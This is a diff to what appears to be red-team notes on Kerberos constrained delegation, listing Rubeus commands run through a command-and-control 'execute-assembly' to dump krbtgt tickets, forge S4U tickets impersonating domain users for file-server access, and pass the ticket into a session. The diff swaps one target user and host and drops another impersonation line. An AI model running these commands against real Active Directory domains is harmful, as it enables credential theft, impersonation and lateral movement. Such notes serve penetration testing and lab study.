@@ -33,9 +33,8 @@ constrained delegation takes it a step further by allowing you to configure whic
 ```
 execute-assembly C:\Users\Public\Rubeus.exe triage
 execute-assembly C:\Users\Public\Rubeus.exe dump /service:krbtgt /nowrap
-execute-assembly C:\Users\Public\Rubeus.exe s4u /impersonateuser:MeMe /msdsspn:cifs/fs-1.insomnia.io /ticket: /nowrap
+execute-assembly C:\Users\Public\Rubeus.exe s4u /impersonateuser:John /msdsspn:cifs/FS01.insomnia.io /ticket: /nowrap
 execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
-execute-assembly C:\Users\Public\Rubeus.exe s4u /impersonateuser:hjensen /msdsspn:time/srv-2.child.redteamops.local /altservice:cifs /ticket:
 execute-assembly C:\Users\Public\Rubeus.exe ptt /ticket: /luid:0x239b995
 ```
 ### Resource-based Constrained Delegation
